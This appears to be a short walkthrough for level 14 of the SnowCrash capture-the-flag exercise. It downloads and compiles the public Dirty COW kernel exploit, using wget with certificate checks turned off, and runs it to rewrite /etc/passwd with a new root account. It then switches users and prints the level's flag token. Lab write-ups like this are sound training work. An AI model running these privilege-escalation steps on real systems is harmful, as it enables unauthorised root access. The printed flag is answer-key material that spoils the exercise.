# SnowCrash Level14 Guide
This guide will walk you through the process to connect as the `flag14` user.

## Procedure:

1. **Examine your environment**

`uname -a` : Display system informations.
```
Linux SnowCrash 3.2.0-89-generic-pae #127-Ubuntu SMP Tue Jul 28 09:52:21 UTC 2015 i686 i686 i386 GNU/Linux
```

The linux kernel version 3.2.0-89-generic-pae is vulnerable to dirty cow exploit.

2. **Getting exploit sources**

On client download the exploit source file:
```bash
wget --no-check-certificate https://raw.githubusercontent.com/firefart/dirtycow/refs/heads/master/dirty.c
```

Copy the file on host:
```bash
scp -P 4242 ./dirty.c level14@<host-ip>:/tmp/dirty.c
```

Compile file on host:
```bash
cd /tmp
gcc -pthread dirty.c -o dirty -lcrypt
```

3. **Run exploit**

Run exploit binary:
```bash
./dirty is_secure
```

Login as firefart:
```bash
su firefart
Password: is_secure
```

Restore the old passwd file:
```
mv /tmp/passwd.bak /etc/passwd
```

4. **Get the flag**

Switch to user flag14:
```bash
su flag14
```

Get the flag:
```bash
getflag
```

Check flag.Here is your token : 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
